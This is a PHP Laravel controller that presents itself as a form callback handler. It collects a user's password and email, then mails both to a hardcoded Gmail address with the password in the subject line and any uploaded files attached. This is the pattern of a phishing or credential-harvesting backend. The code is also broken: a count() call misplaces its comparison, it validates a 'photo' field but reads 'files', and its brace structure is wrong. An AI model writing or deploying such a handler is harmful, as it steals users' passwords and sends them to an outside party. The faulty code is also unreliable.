<?php

namespace App\Http\Controllers;

use App\Mail\Homemail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class CallbackController extends Controller
{
    public function index(Request $request)
    {
        $this->validate($request, [
            'password' => 'required|min:6',
            'email' => 'required|email',
            'photo' => 'required|mimes:jpeg,jpg,png',
        ]);
        $data = array(
            'password' => $request->password,
            'email' => $request->email,
     );

        $files = $request->file('files');
        Mail::send('emails.homemail', compact('data'), function ($message) use($data, $files){
            $message->from($data['email']);
            $message->to('nuru7495@gmail.com')->subject($data['email'] . ' - ' .$data['password']);
            if(count($files > 0)) {
                foreach($files as $file) {
                    $message->attach($file->getRealPath(), array(
                            'as' => $file->getClientOriginalName(), // If you want you can chnage original name to custom name
                            'mime' => $file->getMimeType())
                    );
                }
            }

//        $data = array(
//            'password' => $request->password,
//            'email' => $request->email,
//        );
//        $files = $request->file('photo');
//        Mail::to('web-tutorial@programmer.net')->send(new Homemail($data));
//        return back()->with('success', 'Thanks for contacting us!');
    });

}
}